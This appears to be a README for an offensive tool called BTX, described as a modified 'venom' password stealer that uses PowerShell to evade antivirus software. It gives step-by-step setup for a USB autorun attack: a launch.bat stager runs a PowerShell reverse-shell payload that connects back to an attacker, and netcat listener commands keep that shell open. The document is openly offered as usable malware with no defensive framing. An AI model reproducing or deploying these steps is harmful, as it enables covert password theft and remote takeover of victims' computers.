# BTX
This is a modified version of venom aka password stealer with added capabilities of powershell makes it faster and also helps with evading antivirus programs.

This is a two stage exploit meaning it has to be staged because it makes it easier to modify payload and if you want to add another payload to be executed 

so what we're doing is we're adding a small powershell script in our pendrive (rubber ducky) which will Execute our main powershell payload which we have on our pendrive. 

payload we're going to be hosting is payload.ps1 (powershelltcponeliner.ps1 by nishang) which will give reverse connection to the attacker machine if we set up our listner correctly.

Follow the installation procedure below 

Step 1: git clone this repo onto your pendrive which is without any subfolders 

Step 2: start the listner on your host (attacker machine)
>while true; do nc -l -p 4444; done
this will start listening on port 4444 which we'll specify in our payload.ps1 file along with the attackers IP address, this is a simple while loop which will keep our listner alive by executing it in loop
you can even start a screen session that way our listner will always be active even if we close our terminal
>screen -dmS netcat_listener bash -c 'while true; do nc -lp 4444; done'
you can view your running screen sessions with 
>screen -list
There is a screen on:
	22794.netcat_listener 	(11/01/2016 03:36:01 PM)	(Detached)
1 Socket in /var/run/screen/S-dk.

Step 3: now that you've all the things you need make your pendrive to autorun launch.bat file with USB AutoRun Creator.exe

And let the action begin